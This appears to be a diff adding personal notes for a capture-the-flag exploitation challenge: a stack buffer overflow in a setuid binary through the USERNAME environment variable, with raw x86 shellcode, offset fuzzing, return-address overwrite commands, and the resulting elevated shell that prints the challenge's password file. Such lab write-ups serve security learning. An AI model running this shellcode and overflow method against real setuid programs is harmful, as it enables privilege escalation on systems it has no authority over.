@@ -1,0 +1,87 @@
+
+
+* Setup SHELLCODE environment variable up first, this is to avoid moving
+	the stack.
+
+(local606)
+
+SHELLCODE=$(python -c 'print "D" * 33')
+
+size = 33
+SHELLCODE=\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
+
+
+Skeleton Exploit
+================
+env variable SHELLCODE - 63 bytes
+30 NOP								# NOP is used for discepencies. Encoding.
+33 shellcode
+
+
+Fuzz @ 424
+Overwrite EIP @ "A" * 420 + "B" * 4
+EIP to USERNAME environment variable, "A" * 420 + USERNAME
+[Crashes @ "A" * 416 offset]
+Overwrite EIP @ "A" * 416 + "B" * 4
+EIP to SHELLCODE
+
+
+1. Fuzz
+
+	export USERNAME=$(python -c 'print "A" * 424')
+	./ch8
+
+	SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141}
+
+2. 1st eip overwrite
+
+	export USERNAME=$(python -c 'print "A" * 420 + "B" * 4')
+	./ch8
+
+
+	SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242}
+
+
+3. eip2USERNAME - start of "A" padding, crash @ "A" * 416 offset.
+				  use pattern_create -l 420
+
+	export USERNAME=$(python -c 'print "A" * 420 + "\xaa\xfc\xff\xbf"')
+	app-systeme-ch8@challenge02:~$ /tmp/./envf USERNAME ./ch8
+	USERNAME will be at 0xbffffcaa
+
+
+	SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141}
+
+
+4. 2nd eip overwrite @ "A" * 416 + "B" * 4
+
+	pattern_create -l 420
+	pattern_offset -q 0x396e4138
+	[*] Exact match at offset 416	
+
+	export USERNAME=$(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9" + "\xaa\xfc\xff\xbf"')
+
+	export USERNAME=$(python -c 'print "A" * 416 + "BBBB" + "\xaa\xfc\xff\xbf"')
+	
+	SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242}
+
+
+
+5. eip2SHELLCODE.
+
+	app-systeme-ch8@challenge02:~$ /tmp/./envf SHELLCODE ./ch8
+	SHELLCODE will be at 0xbffffbae
+	
+	export USERNAME=$(python -c 'print "A" * 416 + "\xae\xfb\xff\xbf" + "\xaa\xfc\xff\xbf"')
+
+
+$ ./ch8 
+[+] Getting env...
+bash-4.3$ id
+uid=1108(app-systeme-ch8) gid=1108(app-systeme-ch8) euid=1208(app-systeme-ch8-cracked) groups=1208(app-systeme-ch8-cracked),100(users),1108(app-systeme-ch8)
+bash-4.3$ ls -l .passwd
+-r--r----- 1 app-systeme-ch8-cracked app-systeme-ch8-cracked 14 Feb  8  2012 .passwd
+bash-4.3$ cat .passwd
+s2$srAkdAq18q
+bash-4.3$ 
+
